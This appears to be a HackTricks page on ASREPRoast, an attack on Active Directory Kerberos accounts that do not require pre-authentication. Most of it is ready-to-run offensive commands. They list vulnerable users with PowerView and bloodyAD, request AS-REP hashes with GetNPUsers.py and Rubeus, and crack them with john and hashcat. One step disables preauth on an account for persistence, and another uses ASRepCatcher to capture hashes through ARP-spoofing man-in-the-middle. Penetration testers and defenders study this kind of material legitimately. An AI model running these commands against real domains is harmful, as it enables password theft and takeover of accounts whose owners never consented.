# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.

#### Enumerating vulnerable users (need domain credentials)

```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

#### Request AS_REP message

```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

> [!WARNING]
> AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.

### Cracking

```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```

### Persistence

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):

```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```

## ASREProast without credentials

An attacker can use a man-in-the-middle position to capture AS-REP packets as they traverse the network without relying on Kerberos pre-authentication being disabled. It therefore works for all users on the VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) allows us to do so. Moreover, the tool forces client workstations to use RC4 by altering the Kerberos negotiation.

```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

---

{{#include ../../banners/hacktricks-training.md}}



